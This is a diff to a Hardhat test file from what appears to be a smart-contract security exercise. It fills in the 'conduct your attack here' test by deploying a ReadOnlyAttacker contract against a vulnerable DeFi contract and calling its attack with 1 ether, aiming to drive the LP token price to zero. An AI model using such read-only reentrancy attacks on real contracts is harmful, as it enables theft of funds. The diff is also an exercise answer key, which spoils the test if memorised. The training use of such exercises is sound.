@@ -42,11 +42,13 @@ describe(NAME, function () {
 
         // prettier-ignore
         it("conduct your attack here", async function () {
-    
-    });
+            const ReadOnlyAttacker = await ethers.getContractFactory("ReadOnlyAttacker");
+            const readOnlyAttacker = await ReadOnlyAttacker.connect(attackerWallet).deploy(readOnlyContract.address, vulnerableDeFiContract.address);
+            await readOnlyAttacker.connect(attackerWallet).attack({value: ethers.utils.parseEther("1")});
+        });
 
         after(async function () {
-            console.log(await vulnerableDeFiContract.lpTokenPrice());
+            console.log(parseInt(await vulnerableDeFiContract.lpTokenPrice()));
             expect(await vulnerableDeFiContract.lpTokenPrice()).to.be.equal(0, "snapshotPrice should be zero");
             expect(await ethers.provider.getTransactionCount(attackerWallet.address)).to.lessThan(
                 3,
